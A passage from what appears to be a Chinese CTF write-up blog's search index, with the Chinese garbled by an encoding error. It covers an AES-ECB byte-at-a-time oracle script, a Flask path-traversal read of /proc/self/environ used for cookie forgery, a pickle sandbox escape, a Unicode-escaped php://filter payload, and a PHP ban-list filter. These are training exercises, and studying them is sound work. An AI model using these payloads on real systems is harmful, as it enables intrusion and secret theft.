aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 226.Message length is 58Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 226.Message length is 59Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 258.Message length is 60Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 258.Message length is 61Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 258.Message length is 62Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 258.Message length is 63Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 258.Message length is 64[*] Closed connection to 127.0.0.1 port 8060Process finished with exit code 0 æ³¨æ„åˆ°æ¯æ¬¡â€œaâ€å¢åŠ 8ä½ï¼Œå¯†æ–‡çš„ç›¸åŒéƒ¨åˆ†å°±ä¼šå¢åŠ 32ä½ã€‚é‚£ä¹ˆæˆ‘ä»¬çŒœæµ‹è¿™ä¸ªæ˜¯ECBåŠ å¯†ï¼Œå› ä¸ºECBåŠ å¯†æ¯æ¬¡é’ˆå¯¹ä¸€ç»„æ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œä¸”ä¸ä¼šé‡ç”¨ä¹‹å‰çš„å¯†æ–‡ç»“æœã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆä¸€ä¸ªaä¸ä¸¤ä¸ªaå…·æœ‰å®Œå…¨ä¸ç›¸åŒçš„ç»“æœï¼Œç›´åˆ°å‘é€'a'*9çš„æ—¶å€™æ‰ç¨³å®šä¸‹æ¥å¯†æ–‡ã€‚é‚£ä¹ˆå°±å¤§èƒ†çŒœæµ‹ä¸€ä¸‹æœåŠ¡ç«¯åŠ å¯†çš„æ—¶å€™æ˜¯æŠŠflagä¸æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸€èµ·åŠ å¯†äº†ï¼Œå¹¶ä¸”å…¶ç»„åˆæ–¹å¼åº”è¯¥æ˜¯encrypt(random+input_string+flag)ï¼Œå› ä¸ºflagåœ¨å‰çš„æ—¶å€™å¯†æ–‡å‰åŠéƒ¨åˆ†åº”è¯¥æ˜¯ç¨³å®šçš„ï¼Œè€Œæ¯æ¬¡è¿æ¥æœåŠ¡çš„æ—¶å€™ï¼Œåˆ°å¯†æ–‡ç¨³å®šçš„è·ç¦»éƒ½ä¸ä¸€æ ·ã€‚ å¯¹äºECBæ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é€ä½çˆ†ç ´çš„æ–¹å¼å¾—åˆ°æ˜æ–‡ã€‚ä¸è€ƒè™‘randomåŒºåŸŸå¹¶å‡è®¾flagä¸ºflag{teststring_0123456789}ã€‚æˆ‘ä»¬å‘é€\"a\"*16ï¼ŒæœåŠ¡å™¨å®é™…åŠ å¯†çš„å­—ç¬¦ä¸²æ˜¯\"a\"*16+\"flag{teststring_0123456789}\"ï¼Œå¯ä»¥å¾—åˆ°ç¬¬ä¸€ä¸ªBlock \"a\"*16çš„å¯†æ–‡ç»“æœã€‚é‚£ä¹ˆå‘é€\"a\"*15ï¼ŒæœåŠ¡å™¨åŠ å¯†çš„å°±æ˜¯\"a\"*15+\"flag{teststring_0123456789}\"ï¼Œç¬¬ä¸€ä¸ªBlockçš„å†…å®¹å®é™…ä¸Šæ˜¯\"a\"*15+\"f\"ï¼Œæˆ‘ä»¬è®°ä¸‹è¿™ä¸ªBlockçš„å¯†æ–‡ç»“æœã€‚ç„¶åå¼€å§‹å¯¹ç¬¬ä¸€ä¸ªBlockçš„æœ€åä¸€ä½è¿›è¡Œçˆ†ç ´ï¼Œå½“çˆ†ç ´åˆ°æœ€åä¸€ä½æ˜¯\"f\"æ—¶å‘ç°ä¸åˆšåˆšå¾—åˆ°çš„ç»“æœä¸€æ ·ã€‚é‚£ä¹ˆå°±è¯æ˜flagçš„ç¬¬ä¸€ä½æ˜¯\"f\"ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬å‘é€\"a\"*14ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªBlockå®é™…ä¸Šæ˜¯\"a*14\"+\"fl\"ï¼Œ æˆ‘ä»¬å·²çŸ¥flagç¬¬ä¸€ä½æ˜¯\"f\"ï¼Œé‚£ä¹ˆå‘é€\"a*14\"+\"f\"ï¼Œå¹¶çˆ†ç ´æœ€åä¸€ä½ï¼Œçˆ†ç ´åˆ°\"l\"å‘ç°ç»“æœä¸€è‡´ï¼Œé‚£ä¹ˆflagå‰ä¸¤ä½æ˜¯\"fl\"ï¼Œå¦‚æ­¤å¾ªç¯ã€‚ é‚£ä¹ˆå½“flagå¤§äº16ä½çš„æ—¶å€™ï¼Œåˆæ€ä¹ˆå¤„ç†ï¼Ÿå‡è®¾flagä¸ºflag{teststring_0123456789}ï¼Œä¸Šä¸€æ®µæ‰€è¿°æ–¹æ³•æˆ‘ä»¬å¯ä»¥å¾—åˆ°flag{teststring_ã€‚å½“æˆ‘ä»¬å‘é€'a'*15çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªBlockå†…å®¹æ˜¯'a'*15+'f'ï¼Œç¬¬äºŒä¸ªBlockå†…å®¹ä¸º\"lag{testring_\"+\"0\"ã€‚é‚£ä¹ˆæˆ‘ä»¬çˆ†ç ´ç¬¬äºŒä¸ªBlockçš„å†…å®¹å°±å¯ä»¥äº†ã€‚ æ€è·¯æ˜ç¡®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å†™è„šæœ¬å¥½äº†ã€‚å¯¹äºrandomåŒºåŸŸå¤„ç†ï¼Œé€šè¿‡åˆ¤æ–­ä»€ä¹ˆæ—¶å€™å¯†æ–‡å‰32ä½ç¨³å®šå°±å¯ä»¥äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# coding=utf-8from pwn import *context.log_level = &#x27;debug&#x27;s = connect(&#x27;127.0.0.1&#x27;, 8060)s.recvline()def recv_encrypted(message): s.recv() s.sendline(message) s.recvline() return s.recvline()def get_pad(): print(&quot;[+] Getting pad.&quot;) pad = 0 for i in range(1, 30): message = &quot;a&quot; * i encrypted_prev = recv_encrypted(message) # get previous encrypted message message = &quot;a&quot; * (i + 1) encrypted_now = recv_encrypted(message) # get now encrypted message print(&quot;prev: &#123;0&#125;,now: &#123;1&#125;&quot;.format(encrypted_prev[0:31], encrypted_now[0:31])) if encrypted_prev[0:31] == encrypted_now[0:31]: pad = i break print(&quot;pad is &#123;0&#125;&quot;.format(pad)) return paddef brute_flag(pad): result = &quot;&quot; for rounds in range(0, 10): temp_result = &quot;&quot; # flagæ¯ä¸€è½®æ·»åŠ 16ä½ random_char = random.choice(string.ascii_letters + string.digits) for a in range(15, -1, -1): initial_message = &quot;a&quot; * pad + random_char * a initial = recv_encrypted(initial_message) # å›ºå®šå€¼ for i in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~&#x27;: message = &quot;a&quot; * pad + (random_char * a) + result + temp_result + i # encrypt_range = slice(32 * (rounds + 1), 32 * (rounds + 2)) # [32:64] encrypt_message = recv_encrypted(message) print(&quot;message is :&#123;0&#125;,encrypted is :&#123;1&#125;,initial is :&#123;2&#125;,initial message is :&#123;3&#125;&quot;.format(message, encrypt_message, initial, initial_message)) if encrypt_message[encrypt_range] == initial[encrypt_range]: # ç¬¬ä¸€è½®æ¯”è¾ƒ[32:64]ï¼Œç¬¬äºŒè½®æ¯”è¾ƒ[64,96] temp_result += i break print(&quot;round &#123;0&#125; flag is: &#123;1&#125;&quot;.format(rounds, temp_result)) result += temp_result if &quot;&#125;&quot; in result: print(&quot;flag is :&#123;0&#125;&quot;.format(result)) breakbrute_flag(get_pad()) flag{e8b74d24-f749-49dc-a9a9-55b979567510}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"ECB","slug":"ECB","permalink":"http://tiaonmmn.github.io/tags/ECB/"}]},{"title":"PASECACTF-2019-Honey_shop","slug":"PASECACTF-2019-Honey-shop","date":"2019-10-19T05:24:26.000Z","updated":"2019-12-10T12:15:12.670Z","comments":true,"path":"2019/10/19/PASECACTF-2019-Honey-shop/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/","excerpt":"PASECA CTF 2019çš„Honey_shopã€‚è¿˜ç®—æ˜¯ç®€å•ã€‚ æ‰“å¼€ç½‘é¡µï¼Œæ˜¯ä¸ªå•†åº—ç½‘é¡µï¼Œæˆ‘ä»¬æ‹¥æœ‰1336å…ƒï¼Œä½†æ˜¯è¦è´­ä¹°Flagéœ€è¦1337å…ƒã€‚ æˆ‘ä»¬æ³¨æ„åˆ°æœ‰ä¸€å¥â€œclick to download our sweet imagesâ€ï¼Œå‘ç°è®¿é—®çš„æ˜¯/download?image=2.jpgï¼Œè¿™æ ·å°±å¯èƒ½å‡ºç°LFIã€‚","text":"PASECA CTF 2019çš„Honey_shopã€‚è¿˜ç®—æ˜¯ç®€å•ã€‚ æ‰“å¼€ç½‘é¡µï¼Œæ˜¯ä¸ªå•†åº—ç½‘é¡µï¼Œæˆ‘ä»¬æ‹¥æœ‰1336å…ƒï¼Œä½†æ˜¯è¦è´­ä¹°Flagéœ€è¦1337å…ƒã€‚ æˆ‘ä»¬æ³¨æ„åˆ°æœ‰ä¸€å¥â€œclick to download our sweet imagesâ€ï¼Œå‘ç°è®¿é—®çš„æ˜¯/download?image=2.jpgï¼Œè¿™æ ·å°±å¯èƒ½å‡ºç°LFIã€‚ æˆ‘ä»¬æˆåŠŸè¯»åˆ°äº†/etc/passwdï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¯»ä»€ä¹ˆå‘¢ï¼Ÿç›®å‰æˆ‘ä»¬ä¹Ÿæ— æ³•è§¦å‘æœ‰å…³Flaskçš„ä»»ä½•æŠ¥é”™ä¿¡æ¯ï¼Œæ‰¾ä¸åˆ°å…¶è·¯å¾„ã€‚é‚£å°±åªèƒ½è¯•ç€è¯»ä¸€ä¸‹/procçš„ç›¸å…³ä¿¡æ¯äº†ã€‚ /proc/self/æ°¸è¿œæŒ‡å‘å½“å‰è¿›ç¨‹ï¼Œæˆ‘ä»¬å°è¯•è¯»ä¸€ä¸‹environæ–‡ä»¶ï¼Œè¿™è®°å½•ç€å½“å‰è¿›ç¨‹ï¼ˆæœ¬é¢˜è€Œè¨€æ˜¯pythonï¼‰çš„ç¯å¢ƒå˜é‡ä¿¡æ¯ã€‚ çœ‹åˆ°æœ‰SECRET_KEYï¼ŒçŒœæµ‹è¿™æ˜¯ç”¨æ¥åŠ å¯†Flaskçš„Cookieçš„ã€‚é‚£ä¹ˆï¼ŒCookieæˆ‘ä»¬å°±å¯ä»¥è§£å¯†äº†ã€‚åˆ©ç”¨ä¹‹å‰æåˆ°è¿‡çš„è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥è§£å‡ºCookieçš„å†…å®¹b'&#123;\"balance\":1336,\"purchases\":[]&#125;'ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠbalanceæ”¹æˆ1338å°±å¯ä»¥è´­ä¹°flagäº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯é‚£ä¸ªè„šæœ¬å¯¹Pythonç‰ˆæœ¬æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œæœ€å¥½æ˜¯åœ¨Python 3.6 Linuxä¸‹è¿è¡Œã€‚ flag{885c84f2-b753-435d-95e1-44de4614dbc3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Python.Flask","slug":"Python-Flask","permalink":"http://tiaonmmn.github.io/tags/Python-Flask/"},{"name":"Cookie","slug":"Cookie","permalink":"http://tiaonmmn.github.io/tags/Cookie/"},{"name":"LFI","slug":"LFI","permalink":"http://tiaonmmn.github.io/tags/LFI/"}]},{"title":"Balsn CTF 2019 Pyshv1","slug":"Balsn-CTF-2019-Pyshv1","date":"2019-10-11T13:21:42.000Z","updated":"2019-12-10T12:15:12.580Z","comments":true,"path":"2019/10/11/Balsn-CTF-2019-Pyshv1/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/11/Balsn-CTF-2019-Pyshv1/","excerpt":"Balsn CTF 2019çš„Pyshv1å’Œ2ã€‚Pythonæ²™ç›’çš„é¢˜ã€‚ Pyshv1","text":"Balsn CTF 2019çš„Pyshv1å’Œ2ã€‚Pythonæ²™ç›’çš„é¢˜ã€‚ Pyshv1 å…ˆçœ‹v1ã€‚ç»™äº†æºç ï¼Œå¹¶ä¸”å·²çŸ¥è¿è¡Œç¯å¢ƒä¸ºPython 3.6ï¼š securePickle.py12345678910111213141516import pickle, iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or &#x27;.&#x27; in name: raise KeyError(&#x27;The pickle is spoilt :(&#x27;) return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps server.py1234567891011121314151617181920212223242526272829#!/usr/bin/python3import securePickle as pickleimport codecspickle.whitelist.append(&#x27;sys&#x27;)class Pysh(object): def __init__(self): self.login() self.cmds = &#123;&#125; def login(self): user = input().encode(&#x27;ascii&#x27;) user = codecs.decode(user, &#x27;base64&#x27;) user = pickle.loads(user) raise NotImplementedError(&quot;Not Implemented QAQ&quot;) def run(self): while True: req = input(&#x27;$ &#x27;) func = self.cmds.get(req, None) if func is None: print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;) else: func()if __name__ == &#x27;__main__&#x27;: pysh = Pysh() pysh.run() è¿™é‡Œç”¨åˆ°äº†pickleï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹pickleæ˜¯ä»€ä¹ˆï¼Œå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡Œã€‚ç®€å•æ¥è¯´ï¼Œpickleæ¨¡å—æ˜¯Pythonç”¨äºåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç”¨çš„ï¼Œæºç åœ¨è¿™é‡Œã€‚pickleå®é™…ä¸Šæ˜¯ä¸€ç§æ ˆç»“æ„çš„è¯­è¨€ï¼Œå­˜åœ¨æŒ‡ä»¤ç»“æ„ã€‚ç›¸æ¯”PHPï¼Œå®ƒæ›´åŠ æ™ºèƒ½åŒ–ï¼Œèƒ½å¤Ÿè¿›è¡Œä¸€äº›è¿ç®—æ“ä½œã€‚ find_class()å‡½æ•°åœ¨pickleæ¨¡å—ä¸­å®ç°ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213 def find_class(self, module, name): # Subclasses may override this.â€‹ if self.proto &lt; 3 and self.fix_imports:â€‹ if (module, name) in _compat_pickle.NAME_MAPPING:â€‹ module, name = _compat_pickle.NAME_MAPPING[(module, name)]â€‹ elif module in _compat_pickle.IMPORT_MAPPING:â€‹ module = _compat_pickle.IMPORT_MAPPING[module]â€‹ __import__(module, level=0)â€‹ if self.proto &gt;= 4:â€‹ return _getattribute(sys.modules[module], name)[0]â€‹ else:â€‹ return getattr(sys.modules[module], name) æ³¨æ„åˆ°å®ƒä¼šgetattr()è¿”å›sys.modulesçš„å†…å®¹ï¼Œsys.modulesæ˜¯ä¸ªdictã€‚é¢˜ç›®æ‰€ç»™çš„æºç é‡å†™äº†find_class()å‡½æ•°ï¼Œé™åˆ¶äº†åªå…è®¸å‡ºç°sysæ¨¡å—çš„å†…å®¹ã€‚å¦‚æœæˆ‘ä»¬ä¸ºsys.modulesæ·»åŠ {'os',module('os')}ï¼Œé‚£ä¹ˆosæ¨¡å—å°±å¯ä»¥è¢«å…¨å±€ä½¿ç”¨äº†ã€‚ æœ‰ä¸€ä¸ªåŸºæœ¬é—®é¢˜æ˜¯ï¼ŒPythonä¸­æ¨¡å—æ˜¯ä»€ä¹ˆï¼Ÿå…·ä½“åŒºåˆ«å‚è€ƒè¿™é‡Œï¼Œå°±æœ¬é¢˜è€Œè¨€ï¼Œå¯ä»¥å•çº¯è®¤ä¸ºæ¨¡å—æ˜¯ä¸€ä¸ªå«åšmoduleçš„ç±»çš„å­ç±»ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬é€šè¿‡pickleååºåˆ—åŒ–sysï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªmoduleç±»ï¼Œè¿™æ ·æ˜¯å¯è¡Œçš„ã€‚è€Œæ‰€æœ‰çš„classéƒ½æ˜¯objectçš„å­ç±»ã€‚ ä¸‹ä¸€é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦æ‰¾åˆ°ä»»æ„æ‰§è¡Œä»£ç çš„æ‰‹æ®µã€‚æˆ‘ä»¬ååºåˆ—åŒ–åï¼Œå¦‚æœæ²¡æœ‰å‡½æ•°æ¥æ‰§è¡Œå°±æ²¡æœ‰ä»»ä½•æ•ˆæœã€‚PHPä¸Šæˆ‘ä»¬æ‰¾é­”æœ¯æ–¹æ³•ï¼ŒåŒæ ·çš„Pythonä¹Ÿæœ‰ï¼Œpickleåœ¨å¤„ç†__reduce__æ–¹æ³•æ—¶å¯èƒ½é€ æˆRCEï¼Œå…·ä½“è¯·å‚è€ƒè¿™é‡Œå’Œè¿™é‡Œã€‚æˆ‘ä»¬åŒæ ·éœ€è¦__reduce__æ–¹æ³•æ¥è§¦å‘ï¼Œå¦åˆ™æˆ‘ä»¬æ²¡æœ‰åŠæ³•æ‰§è¡Œos.system()å‡½æ•°ã€‚ æœ¬é¢˜ç›®å‰æœ‰ä¸¤ç§åšæ³•ï¼šä¸€æ˜¯é€šè¿‡pickleè¯­è¨€ç›´æ¥å†™æŒ‡ä»¤ï¼ŒäºŒæ˜¯æ„é€ ä¸€ä¸ªmoduleç±»ï¼Œåˆ©ç”¨pickleç±»ç”ŸæˆæŒ‡ä»¤ã€‚æˆ‘ä»¬é€‰æ‹©æ„é€ ä¸€ä¸ªç±»ï¼ˆpickleå†™ä¸æ˜ç™½ï¼‰ã€‚ æ„é€ class module å…ˆæ¥ä¸ªåŸºæœ¬æ¡†æ¶ï¼š 123import pickle,sysclass Fake(type(sys)): pass Pythonä¸­ç¦æ­¢ç›´æ¥åˆ›å»ºmoduleç±»ï¼Œæˆ‘ä»¬ç”¨type()é—´æ¥å¾—åˆ°ã€‚åœ¨pickleæ¨¡å—æºç ä¸­find_class()ä½¿ç”¨åˆ°äº†getattrï¼Œ flag{f8b94b7e-e67f-49a7-92dd-37f3ab5ad7ef}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"}]},{"title":"BUUOJåˆ·é¢˜-Web-encode_and_encode","slug":"BUUOJåˆ·é¢˜-Web-encode-and-encode","date":"2019-10-08T08:25:29.000Z","updated":"2019-12-10T12:15:12.599Z","comments":true,"path":"2019/10/08/BUUOJåˆ·é¢˜-Web-encode-and-encode/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/08/BUUOJ%E5%88%B7%E9%A2%98-Web-encode-and-encode/","excerpt":"æ‰“å¼€å°±é€æºç ï¼š","text":"æ‰“å¼€å°±é€æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); is_valid()Banäº†å‡ ä¸ªå…³é”®è¯ï¼šflag php file glob data tp zip zlib pharå’Œ..ï¼Œè¿™æ ·æˆ‘ä»¬æ²¡æ³•ç”¨PHPæµè¯»æ–‡ä»¶äº†ã€‚ç„¶åå®ƒä»php://inputè¯»å†…å®¹ï¼Œæˆ‘ä»¬ç›´æ¥POSTå°±å¯ä»¥äº†ã€‚æˆ‘ä»¬POSTçš„å†…å®¹è¦æ˜¯JSONï¼Œä»–ä¼šè¯»pageçš„é¡¹ï¼Œå¦‚æœè¿”å›å†…å®¹ä¸ç¬¦åˆis_valid()æˆ–è€…æ²¡æœ‰å†…å®¹å°±ä¼šè¿”å›not foundï¼Œå…¶ä»–é”™è¯¯å°±è¿”å›invlaid requestï¼Œç„¶åæŠŠè¿”å›çš„å†…å®¹ä¸­å¦‚æœæœ‰HarekazeCTF{}ï¼Œå°±æŠŠèŠ±æ‹¬å·ä¸­çš„å†…å®¹åˆ æ‰ï¼Œæœ€åè¿”å›ç»“æœã€‚ æ­£å¸¸æƒ…å†µä¸‹æ˜¯æ²¡åŠæ³•ç»•è¿‡is_valid()çš„ï¼Œä½†æ˜¯ä»–æäº¤çš„æ˜¯JSONã€‚JSONå…·æœ‰å¾ˆå¼ºçš„åŒ…å®¹æ€§ï¼Œèƒ½å¤Ÿæ¥æ”¶Unicodeï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨Unicodeç¼–ç å­—ç¬¦å»ç»•è¿‡ã€‚ æ ¹æ®æ‰€ç»™çš„Dockerfileæˆ‘ä»¬å¯ä»¥çŸ¥é“flagåœ¨æ ¹ç›®å½•ä¸‹ã€‚æäº¤&#123;\"page\":\"/fl\\u0061g\"&#125;ï¼ˆaçš„Unicodeç¼–ç æ˜¯U+0061ï¼‰ï¼Œè¿”å›not foundï¼Œå› ä¸º/flagåŒ…å«flagå­—ç¬¦ä¸²ï¼Œæ²¡é€šè¿‡is_valid()ã€‚åŒæ ·çš„ï¼Œç”¨phpæµå°±å¯ä»¥äº†ï¼Œæäº¤&#123;\"page\":\"ph\\u0070\\u003a//filter/convert.base64-encode/resource=/fl\\u0061g\"&#125;ï¼Œè¿”å›Base64ç¼–ç è¿‡çš„flagã€‚åBase64å°±å¯ä»¥äº†ã€‚ flag{c51380a7-35c7-4a81-9e84-486421da5c27}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"},{"name":"JSON","slug":"JSON","permalink":"http://tiaonmmn.github.io/tags/JSON/"}]},{"title":"PwnThyBytes 2019 Baby sql is not baby anymore","slug":"PwnThyBytes-2019-Baby-sql-is-not-baby-anymore","date":"2019-10-08T04:26:56.000Z","updated":"2019-12-10T12:15:12.671Z","comments":true,"path":"2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/","excerpt":"PwnThyBytes 2019çš„Baby sql is not baby anymoreã€‚åå­—å¤Ÿé•¿çš„ã€‚çŒœä¸€ä¸‹æ˜¯SQLæ³¨å…¥çš„é¢˜ã€‚ åŠŸèƒ½å¾ˆç®€å•çš„ï¼Œä¸€ä¸ªç™»é™†ä¸€ä¸ªæ³¨å†Œï¼Œç™»é™†å®Œåªæœ‰ä¸€å¥æç¤ºï¼Œæ²¡æœ‰å…¶ä»–å†…å®¹ã€‚ä¸è¿‡æç¤ºäº†ä¸ªsource.zipã€‚ çœ‹ä¸€ä¸‹æºç ï¼Œindex.phpé‡Œæœ‰ä¸ªfilter()å‡½æ•°ã€‚","text":"PwnThyBytes 2019çš„Baby sql is not baby anymoreã€‚åå­—å¤Ÿé•¿çš„ã€‚çŒœä¸€ä¸‹æ˜¯SQLæ³¨å…¥çš„é¢˜ã€‚ åŠŸèƒ½å¾ˆç®€å•çš„ï¼Œä¸€ä¸ªç™»é™†ä¸€ä¸ªæ³¨å†Œï¼Œç™»é™†å®Œåªæœ‰ä¸€å¥æç¤ºï¼Œæ²¡æœ‰å…¶ä»–å†…å®¹ã€‚ä¸è¿‡æç¤ºäº†ä¸ªsource.zipã€‚ çœ‹ä¸€ä¸‹æºç ï¼Œindex.phpé‡Œæœ‰ä¸ªfilter()å‡½æ•°ã€‚ 123456function filter($value)&#123; !is_string($value) AND die(&quot;Hacking attempt!&quot;); return addslashes($value);&#125; åªç”¨äº†addslasheså¤„ç†äº†POSTå’ŒGETå‚æ•°ï¼Œå¯¹SQLæ³¨å…¥åŸºæœ¬æ²¡æœ‰ä»»ä½•éšœç¢ã€‚login.phpé‚£é‡Œä¹Ÿæ²¡æœ‰ä»»ä½•å…¶ä»–è¿‡æ»¤ã€‚å…³äºç»•è¿‡addslashesæ³¨å…¥å¯å‚è€ƒè¿™ä¸ªå’Œè¿™ä¸ªã€‚ä½†å°±åƒå‚è€ƒæ–‡çŒ®æ‰€è¯´çš„é‚£æ ·ï¼Œaddslashesç»•è¿‡éœ€è¦æœ‰ä¸€äº›ç‰¹å®šæ¡ä»¶ï¼Œå¦‚MySQLä½¿ç”¨GBKç¼–ç ï¼Œæˆ–å…¶ä»–é—®é¢˜ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ï¼Œçœ‹ç½‘é¡µç¼–ç 